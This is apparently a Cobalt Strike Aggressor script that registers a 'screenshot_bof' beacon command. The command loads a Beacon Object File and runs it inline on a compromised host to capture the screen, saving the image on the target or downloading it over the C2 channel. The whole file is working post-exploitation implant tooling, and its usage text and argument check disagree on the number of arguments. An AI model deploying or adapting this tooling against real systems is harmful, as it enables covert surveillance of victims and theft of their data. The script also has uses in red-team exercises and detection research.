
#Register command
beacon_command_register(
    "screenshot_bof",
    "Alternative screenshot capability that does not do fork n run",
    "Use: screenshot_bof [filename] [save method]\nSave methods:\n\t0: drop file to disk\n\t1: download over beacon as a file\n\t2: download over beacon as a screenshot\n\nTake a screenshot inline using a BOF. Screenshot is saved as JPEG on disk or downloaded over beacon."
);

alias screenshot_bof {
    local('$bid $barch $handle $data $args $target_pid');
    $bid = $1;
    # figure out the arch of this session
    $barch  = barch($bid);
    if (size(@_) != 4)
    {
        berror($1, "Syntax: screenshot_bof [filename] [save method 0/1/2] e.g. screenshot_bof file.JPEG 1 1234\nNote: set PID to 0 to capture full screen.");
                return;
    }
    # read in the right BOF file
    $handle = openf(script_resource("ScreenshotBOF. $+ $barch $+ .obj"));
    $data = readb($handle, -1);
    closef($handle);
    
    # FEATURE PUT ON HOLD DUE TO STABILITY
    # figure out if the profile chooses to chunk the post or not (getOnlyProfile)
    # $profile = data_query("metadata")["c2profile"];
    # $getOnlyProfile = [$profile shouldChunkPosts];
    # println($getOnlyProfile);

    $args   = bof_pack($bid, "zii", $2, $3, $4);

    # announce what we're doing
    btask($bid, "Running screenshot BOF by (@codex_tf2)", "T1113");
    # execute it.
    beacon_inline_execute($bid, $data, "go", $args);
}
